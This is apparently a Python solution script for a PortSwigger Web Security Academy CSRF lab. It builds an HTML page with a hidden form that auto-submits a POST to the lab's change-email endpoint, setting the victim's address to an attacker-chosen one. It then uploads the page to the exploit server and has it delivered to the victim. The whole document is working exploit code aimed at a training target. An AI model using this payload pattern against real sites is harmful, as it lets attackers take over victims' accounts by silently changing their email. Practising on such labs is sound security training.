#!/usr/bin/env python3

import requests

# PortSwigger Web Security Academy lab URL.
LAB_URL = "https://0a0e007b0488b4f580d276a200a60018.web-security-academy.net"

# PortSwigger exploit server URL.
EXPLOIT_SERVER_URL = "https://exploit-0a4e009b0462b42780d3758d015f000b.exploit-server.net"

# Email address used in the CSRF exploit.
NEW_EMAIL = "hacked@example.com"

payload = f"""
<html>
<body>
<form method="POST" action="{LAB_URL}/my-account/change-email">
    <input type="hidden" name="email" value="{NEW_EMAIL}">
</form>

<script>
document.forms[0].submit();
</script>
</body>
</html>
"""

data = {
    "responseBody": payload,
    "responseHead": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8",
    "formAction": "DELIVER_TO_VICTIM",
    "urlIsHttps": "on",
    "responseFile": "/exploit"
}

print("[*] Uploading CSRF exploit to the exploit server...\n")

response = requests.post(
    EXPLOIT_SERVER_URL,
    data=data,
)

print("=" * 50)
print(f"Status : {response.status_code}")
print()

if response.status_code == 200:
    print("[+] Exploit uploaded successfully.")
    print("[+] The exploit has been delivered to the victim.")
    print("[+] The lab should now be solved.")
else:
    print("[-] Failed to upload the exploit.")
